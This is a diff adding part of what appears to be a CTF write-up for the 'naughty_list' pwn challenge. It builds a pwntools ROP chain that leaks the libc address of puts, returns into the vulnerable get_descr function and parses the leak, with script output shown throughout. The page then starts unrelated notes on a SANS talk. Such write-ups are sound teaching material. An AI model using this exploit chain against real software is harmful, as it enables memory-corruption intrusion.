@@ -629,7 +629,56 @@ io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
 io.sendlineafter(b&quot;:&quot;, &quot;69&quot;)
 
 io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))
+
+io.interactive()
 </code></pre>
+<p>Running the python script confirms that it indeed leaks the address of the puts function.</p>
+<pre><code>python3 leak.py
+[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4512
+[*] Switching to interactive mode
+    [PENIS]
+[+] Surname: [PENIS]
+[+] Age:     [69]
+
+[*] Name of the gift you want and why you were good enough to deserve it:
+[*] 🎅 will take a better look and hopefuly you will get your 🎁!
+\xa0\xfa\xed3
+[*] Got EOF while reading in interactive
+</code></pre>
+<p>Leaking the function is cool, but the program directly ends after that since our program don't have any valid instruction to execute, for this reason if we want to exploit the program we will need to make a jump into the vulnerable function <code>get_descr</code>. So we're going to add the address of the <code>get_descr</code> function after our call to puts in the plt.</p>
+<pre><code class="language-py">get_descr = pwn.p64(e.symbols.get_descr)
+</code></pre>
+<p>Don't forget to add the line in the payload field after <code>puts_at_plt</code>.</p>
+<pre><code class="language-py">payload = [
+    b&quot;A&quot;*PADDING,
+    pop_rdi,
+    puts_at_got,
+    puts_at_plt,
+    get_descr
+]
+</code></pre>
+<p>You can rerun the program, and see that after leaking the address, it jump backs to our vulnerable function.</p>
+<pre><code>python3 leak.py
+[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4567
+[*] Switching to interactive mode
+    [PENIS]
+[+] Surname: [PENIS]
+[+] Age:     [69]
+
+[*] Name of the gift you want and why you were good enough to deserve it:
+[*] 🎅 will take a better look and hopefuly you will get your 🎁!
+\xa0z֗\xd5
+
+[*] Name of the gift you want and why you were good enough to deserve it: $ test
+[*] 🎅 will take a better look and hopefuly you will get your 🎁!
+</code></pre>
+<p>Notice how the program asks us a second time for the same vulnerable input, this means we successfully were able to jump back inside our vulnerable function.</p>
+<p>Now we need our program to parse the leaked function address, for this we will need to do some trial and error with <code>recvline</code> until we have the right number of lines. After testing i know that i need to skip 6 lines before it leaks our input so you can add the following to your script.</p>
+<pre><code>io.recvlines(6)
+leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
+pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
+</code></pre>
+<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly ! </p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
 <p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
 <h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
